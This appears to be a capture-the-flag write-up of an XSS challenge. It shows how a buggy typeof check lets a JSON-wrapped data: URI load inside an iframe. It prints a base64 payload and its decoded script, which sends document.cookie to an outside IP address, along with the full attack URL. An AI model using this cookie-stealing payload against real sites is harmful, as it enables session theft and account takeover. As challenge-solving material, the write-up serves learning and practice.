Opening it up, we are presented with a simple page which takes a URL and submits it. Opening a non existent page, we are presented with this error

Ah XSSWebsite, so it's probably a XSS challenge. There is probably a bot running on the backend which visits the URL we send.

I tried sending a bunch of domains pointing to my servers but I never received a request, so it probably only visits the it's own url. 

Our aim is to find an XSS and probably get the bot's cookie (or some header).

We find this interesting shit in the source of index.html
[JavaScript code: Function to load scripts or iframes and an event listener for messages]

So this will basically take our data right after the first "?" in the URL, parse it as a JSON object and do some validation checks on it and if it passes all of them, then it will append it to the DOM as a source of a iframe.

Let's look at the checks:
[JavaScript code: Check if data contains '.', '//', and 'ã€‚' and that it's not an object]
This doesn't look hard at all.          

So we can't have `//` and `.` in our value. I knew we can use data:// URI in a iframe source and it executes in the context of the current domain and since we can do like: `data:text/html;base64,<base64 data>`.
It doesn't require `//` or `.` . The final check is somewhat troll: `typeof(e.data.iframe != 'object')`. 

It should've been: `typeof(e.data.iframe) != 'object'`

So our final payload is like: `{"iframe":{"value":"data:text/html;base64,dmFyIHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgcC5vcGVuKCdHRVQnLCdodHRwOi8vMTk5LjI0Ny4yOC45MS9sb2wucGhwPz0nK2RvY3VtZW50LmNvb2tpZSk7IHAuc2VuZCgpOw=="}}`

The base64 simply decodes to: `var p = new XMLHttpRequest(); p.open('GET','http://199.247.28.91/lol.php?='+document.cookie); p.send();`

Which sends the cookie to our server. Our final link becomes: `http://13.57.104.34/?{"iframe":{"value":"data:text/html;base64,dmFyIHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgcC5vcGVuKCdHRVQnLCdodHRwOi8vMTk5LjI0Ny4yOC45MS9sb2wucGhwPz0nK2RvY3VtZW50LmNvb2tpZSk7IHAuc2VuZCgpOw=="}}`

Sending that to the bot, we receive the flag on our server.
